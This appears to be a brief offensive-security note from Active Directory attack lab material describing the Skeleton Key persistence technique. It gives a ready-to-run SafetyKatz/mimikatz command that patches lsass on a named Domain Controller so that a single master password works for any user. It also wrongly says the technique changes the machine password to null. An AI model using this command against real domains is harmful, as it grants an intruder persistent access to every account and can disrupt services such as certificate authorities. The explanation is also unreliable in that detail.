**Not very practical, not OPSEC safe and can break shit like ADCS**

Skeleton key is a persistence technique where it is possible to patch a
Domain Controller (lsass process) so that it allows access as any user
with a single password. All the publicly known methods are NOT persistent across reboots.

Create a skeleton key using mimikatz by essentially changing the machine password to `null`
```powershell
SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```